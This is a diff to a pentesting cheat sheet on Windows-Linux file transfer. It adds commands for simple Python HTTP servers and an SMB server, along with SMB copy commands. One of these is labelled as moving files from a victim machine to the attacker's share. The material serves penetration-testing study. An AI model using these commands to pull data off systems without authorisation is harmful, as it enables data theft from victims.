@@ -5,21 +5,42 @@ description: Windows - Linux File Transfer
 keywords: [file transfer, windows file transfer, pentesting, oscp, smb file transfer, powershell file transfer, certutil file transfer, ftp file transfer, tftp file transfer, vbscript file transfer, scp]
 ---
 
+## HTTP Server
+
+```batch
+:: Python[3]
+python3 -m http.server <PORT>
+
+:: Python[2]
+python -m SimpleHTTPServer <PORT>
+```
+
+```batch
+:: Simple JavaScript HTTP Server
+http-server [path] [options]
+```
+
 ## SMB 
 
 - **Transfer Files `To\From` Windows with `SMB`** 
 
-```powershell
-smbserver $SHARE_NAME $DIRECTORY
-smbserver -smb2support                      # SMB-2 Support
+```batch
+:: Start the SMB Server
+:: -smb2support [SMB-2]
+smbserver <SHARE_NAME> <DIRECTORY>                    
 ```
 
 - **`SMB` Remote Commands**
 
-```powershell
-dir \\$IP\$SHARE_NAME                       # List Share Contents
-copy \\$IP\$SHARE_NAME\$FILE $OUTPUT        # Transfer Files
-copy FILE.exe \\$IP\$SHARE_NAME\OUTPUT.exe  # Transfer From Victim To Attacker
+```batch
+:: List Share Contents
+dir \\IP\SHARE_NAME                       
+
+:: Transfer to Target Machine
+copy \\IP\SHARE_NAME\FILE OUTPUT 
+
+:: Transfer to Attacker Machine
+copy FILE \\IP\SHARE_NAME\OUTPUT
 ```
 
 
